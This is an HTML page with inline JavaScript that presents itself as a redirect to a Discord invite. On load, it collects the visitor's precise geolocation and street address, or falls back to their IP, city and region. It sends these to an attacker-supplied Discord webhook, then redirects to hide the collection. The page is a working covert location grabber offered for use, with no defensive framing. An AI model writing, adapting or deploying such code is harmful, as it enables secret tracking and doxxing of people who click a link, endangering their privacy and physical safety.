<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect to Discord and Send Location</title>
</head>
<body>
    <script>
        // Function to extract the 'webhook' parameter from the URL
        function getWebhookFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('webhook');
        }

        // Function to send data to the provided webhook with formatted message
        function sendToWebhook(webhookUrl, message) {
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: message })
            }).then(response => {
                if (response.ok) {
                    console.log("Message sent to webhook successfully!");
                } else {
                    console.error("Failed to send message to webhook.");
                }
            }).catch(error => {
                console.error("Error sending message:", error);
            });
        }

        // Function to fetch approximate location using the user's IP
        function getApproxLocation() {
            fetch("https://ipinfo.io/json?token=YOUR_IPINFO_API_KEY")  // Replace with your ipinfo.io token
                .then(response => response.json())
                .then(data => {
                    const locationMessage = `
Title: Info From Click
Mini Title: Allowed Location: No
Mini Title: Other Info
IP: ${data.ip}
State/City: ${data.city}, ${data.region}
                    `;
                    sendToWebhook(getWebhookFromUrl(), locationMessage);
                })
                .catch(error => {
                    console.error("Error fetching IP location:", error);
                    // Fallback if IP lookup fails
                    sendToWebhook(getWebhookFromUrl(), "Unable to determine location.");
                });
        }

        // Function to get address from coordinates (latitude, longitude)
        function getAddressFromCoordinates(latitude, longitude) {
            return new Promise((resolve, reject) => {
                fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`)
                    .then(response => response.json())
                    .then(data => {
                        if (data && data.address) {
                            resolve(data.address);
                        } else {
                            reject('No address found');
                        }
                    })
                    .catch(error => {
                        reject('Failed to get address');
                    });
            });
        }

        // Main function to handle geolocation and webhook sending
        function handleRedirectAndWebhook() {
            // Get the webhook URL from the query string
            const webhookUrl = getWebhookFromUrl();

            // Check if webhook is available
            if (webhookUrl) {
                // Get the location (if available)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;

                        // Get address from coordinates
                        getAddressFromCoordinates(latitude, longitude)
                            .then(address => {
                                const geoDetailsMessage = `
Title: Info From Click
Mini Title: Allowed Location: Yes
Address: ${address}
Coordinates: Latitude: ${latitude}, Longitude: ${longitude}
Picture of House: [IMAGE_URL]  // Replace this with a static or placeholder image URL

Mini Title: Other Info
IP: (IP address not fetched as geolocation is enabled)
State/City: (State/City not fetched as geolocation is enabled)
                                `;
                                sendToWebhook(webhookUrl, geoDetailsMessage);
                            })
                            .catch(error => {
                                console.error("Failed to get address:", error);
                                const fallbackMessage = `
Title: Info From Click
Mini Title: Allowed Location: Yes
Address: Not available
Coordinates: Latitude: ${latitude}, Longitude: ${longitude}
Picture of House: [IMAGE_URL]  // Replace this with a static or placeholder image URL

Mini Title: Other Info
IP: (IP address not fetched as geolocation is enabled)
State/City: (State/City not fetched as geolocation is enabled)
                                `;
                                sendToWebhook(webhookUrl, fallbackMessage);
                            });

                        // Redirect to the Discord invite link
                        window.location.href = "https://discord.gg/perkbios";
                    }, function(error) {
                        console.error("Geolocation error:", error);
                        // If the user denies location, fall back to IP-based location
                        getApproxLocation();

                        // Redirect to Discord even if geolocation is denied
                        window.location.href = "https://discord.gg/perkbios";
                    });
                } else {
                    console.log("Geolocation is not supported by this browser.");
                    // Fall back to IP-based location if geolocation is not supported
                    getApproxLocation();

                    // Redirect to Discord if geolocation is not supported
                    window.location.href = "https://discord.gg/perkbios";
                }
            } else {
                console.error("No webhook URL found in the query string.");
            }
        }

        // Call the main function when the page loads
        handleRedirectAndWebhook();
    </script>
</body>
</html>
